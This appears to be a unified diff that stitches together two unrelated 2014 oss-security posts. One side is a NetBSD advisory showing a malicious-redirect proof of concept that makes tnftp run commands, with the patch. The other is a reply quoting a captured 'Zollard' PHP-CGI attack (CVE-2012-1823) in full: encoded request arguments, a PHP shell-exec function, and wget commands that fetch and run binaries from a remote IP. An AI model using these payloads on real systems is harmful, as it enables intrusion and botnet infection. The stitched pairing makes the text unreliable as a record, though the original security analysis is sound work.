@@ -1,208 +1,101 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/10/28/4
-Message-ID: <20141028165037.GC6211@nef.pbox.org>
-Date: Tue, 28 Oct 2014 17:50:37 +0100
-From: Alistair Crooks <agc@...bsd.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/10/10/22
+Message-ID: <CAJCB1PHrXCX+DzkHLfvSesjnCAi=01L0icD8H4kuw4ZyW_-WhA@mail.gmail.com>
+Date: Fri, 10 Oct 2014 12:31:27 -0700
+From: Jon Hart <jhart@...ofed.org>
 To: oss-security@...ts.openwall.com
-Cc: security-officer@...bsd.org
-Subject: ftp(1) can be made execute arbitrary commands by malicious webserver
+Subject: Re: What does this PHP exploit do?
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+I believe this is exploiting CVE-2012-1823 but utilizing POST to bypass URL
+length limits, IDS/IPS/monitoring, etc.
 
-Despite being old, tnftp(1) is quite widely used, hence this request.
+-jon
 
-Could we get a CVE issued for this one, please?
+On Fri, Oct 10, 2014 at 12:28 PM, Dave Horsfall <dave@...sfall.org> wrote:
 
-Sorry about the lack of warning, I wasn't aware of the issue before
-the fixes were committed to the repo.
+> My apologies if this is off-topic for this list, but out of all the
+> security lists of which I am a member this seems to be the closest one
+> that fits, so please point me to a more appropriate one in that case..
+>
+> I'm trying to figure out what this exploit does; it started around the
+> time that Shellshock did, but I don't think that they're related.
+>
+> It downloads binaries for several architectures (even a MIPS) which
+> amongst other things futzes around with IPTABLES (including blocking the
+> TELNET port) and appears to be self-reproducing.
+>
+> The hex-encoded stuff in the script below decodes to
+>
+>
+> "-d+allow_url_include=on+-d+safe_mode=off+-d+suhosin.simulation=on+-d+disable_functions=""+-d+open_basedir=none+-d+auto_prepend_file=php://input+-d+cgi.force_redirect=0+-d+cgi.redirect_status_env=0+-n"
+>
+> but my PHP-fu doesn't quite extend that far (and that "safe_mode=off"
+> looks a bit suss).
+>
+> Script below, kindly supplied by 0wned boxes the world over (in this case,
+> Korea):
+>
+> POST
+> /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E
+> HTTP/1.1
+> Host: xxx.xxx.xxx.xxx
+> User-Agent: Mozilla/5.0 (compatible; Zollard; Linux)
+> Content-Type: application/x-www-form-urlencoded
+> Content-Length: 1817
+> Connection: close
+>
+> <?php
+> echo "Zollard";
+> $disablefunc = @ini_get("disable_functions");
+> if (!empty($disablefunc))
+> {
+>  $disablefunc = str_replace(" ","",$disablefunc);
+>  $disablefunc = explode(",",$disablefunc);
+> }
+> function myshellexec($cmd)
+> {
+>  global $disablefunc;
+>  $result = "";
+>  if (!empty($cmd))
+>  {
+>   if (is_callable("exec") and !in_array("exec",$disablefunc))
+> {exec($cmd,$result); $result = join("\n",$result);}
+>   elseif (($result = `$cmd`) !== FALSE) {}
+>   elseif (is_callable("system") and !in_array("system",$disablefunc)) {$v
+> = @ob_get_contents(); @ob_clean(); system($cmd); $result =
+> @ob_get_contents(); @ob_clean(); echo $v;}
+>   elseif (is_callable("passthru") and !in_array("passthru",$disablefunc))
+> {$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result =
+> @ob_get_contents(); @ob_clean(); echo $v;}
+>   elseif (is_resource($fp = popen($cmd,"r")))
+>   {
+>    $result = "";
+>    while(!feof($fp)) {$result .= fread($fp,1024);}
+>    pclose($fp);
+>   }
+>  }
+>  return $result;
+> }
+> myshellexec("rm -rf /tmp/armeabi;wget -P /tmp
+> http://119.206.52.15:58455/armeabi;chmod +x /tmp/armeabi");
+> myshellexec("rm -rf /tmp/arm;wget -P /tmp
+> http://119.206.52.15:58455/arm;chmod +x /tmp/arm");
+> myshellexec("rm -rf /tmp/ppc;wget -P /tmp
+> http://119.206.52.15:58455/ppc;chmod +x /tmp/ppc");
+> myshellexec("rm -rf /tmp/mips;wget -P /tmp
+> http://119.206.52.15:58455/mips;chmod +x /tmp/mips");
+> myshellexec("rm -rf /tmp/mipsel;wget -P /tmp
+> http://119.206.52.15:58455/mipsel;chmod +x /tmp/mipsel");
+> myshellexec("rm -rf /tmp/x86;wget -P /tmp
+> http://119.206.52.15:58455/x86;chmod +x /tmp/x86");
+> myshellexec("rm -rf /tmp/nodes;wget -P /tmp
+> http://119.206.52.15:58455/nodes;chmod +x /tmp/nodes");
+> myshellexec("rm -rf /tmp/sig;wget -P /tmp
+> http://119.206.52.15:58455/sig;chmod +x /tmp/sig");
+>
+> myshellexec("/tmp/armeabi;/tmp/arm;/tmp/ppc;/tmp/mips;/tmp/mipsel;/tmp/x86;");
+>
+> -- Dave
+>
 
-FreeBSD and Dragonfly have been informed, as has Apple, and I have
-received a boilerplate reply from Apple.  The issue is present in
-10.10 (Yosemite).
-
-Thanks,
-Alistair
----
-Security Officer, NetBSD
-
-
-Just a quick heads-up, and sorry that no notice was given - the issue
-is that a malicious server can cause ftp(1) to execute arbitrary
-commands:
-
-   If you do "ftp http://server/path/file.txt" and don't specify an output
-   filename with -o, the ftp program can be tricked into executing
-   arbitrary commands.
-
-   The FTP client will follow HTTP redirects, and uses the part of the
-   path after the last / from the last resource it accesses as the output
-   filename (as long as -o is not specified).
-
-   After it resolves the output filename, it checks to see if the output
-   filename begins with a "|", and if so, passes the rest to
-   popen(3): http://nxr.netbsd.org/xref/src/usr.bin/ftp/fetch.c#1156
-
-   Here's a simple CGI script that causes ftp to execute "uname -a", the
-   issue is present on both NetBSD 7.99.1 and OSX 10.10:
-
-     a20$ pwd
-     /var/www/cgi-bin
-     a20$ ls -l
-     total 4
-     -rwxr-xr-x  1 root  wheel  159 Oct 14 02:02 redirect
-     -rwxr-xr-x  1 root  wheel  178 Oct 14 01:54 |uname -a
-     a20$ cat redirect
-     #!/bin/sh
-     echo 'Status: 302 Found'
-     echo 'Content-Type: text/html'
-     echo 'Connection: keep-alive'
-     echo 'Location: http://192.168.2.19/cgi-bin/|uname%20-a'
-     echo
-     a20$
-   a20$ ftp http://localhost/cgi-bin/redirect
-   Trying ::1:80 ...
-   ftp: Can't connect to `::1:80': Connection refused
-   Trying 127.0.0.1:80 ...
-   Requesting http://localhost/cgi-bin/redirect
-   Redirected to http://192.168.2.19/cgi-bin/|uname%20-a
-   Requesting http://192.168.2.19/cgi-bin/|uname%20-a
-       32      101.46 KiB/s
-   32 bytes retrieved in 00:00 (78.51 KiB/s)
-   NetBSD a20 7.99.1 NetBSD 7.99.1 (CUBIEBOARD) #113: Sun Oct 26 12:05:36
-   ADT 2014
-   Jared@...ed-PC:/cygdrive/d/netbsd/src/sys/arch/evbarm/compile/obj/CUBIE
-   BOARD evbarm
-   a20$
-
-The issue was found by Jared Mcneill.
-
-Sorry for the lack of notice, I wasn't aware of the issue before fixes
-were committed to the NetBSD repo.  These fixes are attached to this
-mail.
-
-Regards,
-Alistair
---
-NetBSD Security Officer
-
-Date: Sun, 26 Oct 2014 12:21:59 -0400
-From: Christos Zoulas <christos@...bsd.org>
-To: source-changes-full@...bsd.org
-Subject: CVS commit: src/usr.bin/ftp
-X-Mailer: log_accum
-
-Module Name:	src
-Committed By:	christos
-Date:		Sun Oct 26 16:21:59 UTC 2014
-
-Modified Files:
-	src/usr.bin/ftp: fetch.c
-
-Log Message:
-don't pay attention to special characters if they don't come from the command
-line (from jmcneill)
-
-
-To generate a diff of this commit:
-cvs rdiff -u -r1.205 -r1.206 src/usr.bin/ftp/fetch.c
-
-Please note that diffs are not public domain; they are subject to the
-copyright notices on the relevant files.
-
-
-Modified files:
-
-Index: src/usr.bin/ftp/fetch.c
-diff -u src/usr.bin/ftp/fetch.c:1.205 src/usr.bin/ftp/fetch.c:1.206
---- src/usr.bin/ftp/fetch.c:1.205	Wed Nov  6 21:06:51 2013
-+++ src/usr.bin/ftp/fetch.c	Sun Oct 26 12:21:59 2014
-@@ -1,4 +1,4 @@
--/*	$NetBSD: fetch.c,v 1.205 2013/11/07 02:06:51 christos Exp $	*/
-+/*	$NetBSD: fetch.c,v 1.206 2014/10/26 16:21:59 christos Exp $	*/
- 
- /*-
-  * Copyright (c) 1997-2009 The NetBSD Foundation, Inc.
-@@ -34,7 +34,7 @@
- 
- #include <sys/cdefs.h>
- #ifndef lint
--__RCSID("$NetBSD: fetch.c,v 1.205 2013/11/07 02:06:51 christos Exp $");
-+__RCSID("$NetBSD: fetch.c,v 1.206 2014/10/26 16:21:59 christos Exp $");
- #endif /* not lint */
- 
- /*
-@@ -571,7 +571,7 @@ fetch_url(const char *url, const char *p
- 	url_decode(decodedpath);
- 
- 	if (outfile)
--		savefile = ftp_strdup(outfile);
-+		savefile = outfile;
- 	else {
- 		cp = strrchr(decodedpath, '/');		/* find savefile */
- 		if (cp != NULL)
-@@ -595,8 +595,7 @@ fetch_url(const char *url, const char *p
- 	rangestart = rangeend = entitylen = -1;
- 	mtime = -1;
- 	if (restartautofetch) {
--		if (strcmp(savefile, "-") != 0 && *savefile != '|' &&
--		    stat(savefile, &sb) == 0)
-+		if (stat(savefile, &sb) == 0)
- 			restart_point = sb.st_size;
- 	}
- 	if (urltype == FILE_URL_T) {		/* file:// URLs */
-@@ -1150,18 +1149,26 @@ fetch_url(const char *url, const char *p
- 		}
- 	}		/* end of ftp:// or http:// specific setup */
- 
--			/* Open the output file. */
--	if (strcmp(savefile, "-") == 0) {
--		fout = stdout;
--	} else if (*savefile == '|') {
--		oldpipe = xsignal(SIGPIPE, SIG_IGN);
--		fout = popen(savefile + 1, "w");
--		if (fout == NULL) {
--			warn("Can't execute `%s'", savefile + 1);
--			goto cleanup_fetch_url;
-+	/* Open the output file. */
-+
-+	/*
-+	 * Only trust filenames with special meaning if they came from
-+	 * the command line
-+	 */
-+	if (outfile == savefile) {
-+		if (strcmp(savefile, "-") == 0) {
-+			fout = stdout;
-+		} else if (*savefile == '|') {
-+			oldpipe = xsignal(SIGPIPE, SIG_IGN);
-+			fout = popen(savefile + 1, "w");
-+			if (fout == NULL) {
-+				warn("Can't execute `%s'", savefile + 1);
-+				goto cleanup_fetch_url;
-+			}
-+			closefunc = pclose;
- 		}
--		closefunc = pclose;
--	} else {
-+	}
-+	if (fout == NULL) {
- 		if ((rangeend != -1 && rangeend <= restart_point) ||
- 		    (rangestart == -1 && filesize != -1 && filesize <= restart_point)) {
- 			/* already done */
-@@ -1379,7 +1386,8 @@ fetch_url(const char *url, const char *p
- 		(*closefunc)(fout);
- 	if (res0)
- 		freeaddrinfo(res0);
--	FREEPTR(savefile);
-+	if (savefile != outfile)
-+		FREEPTR(savefile);
- 	FREEPTR(uuser);
- 	if (pass != NULL)
- 		memset(pass, 0, strlen(pass));
-
-
-
-
-
-
------ End forwarded message -----
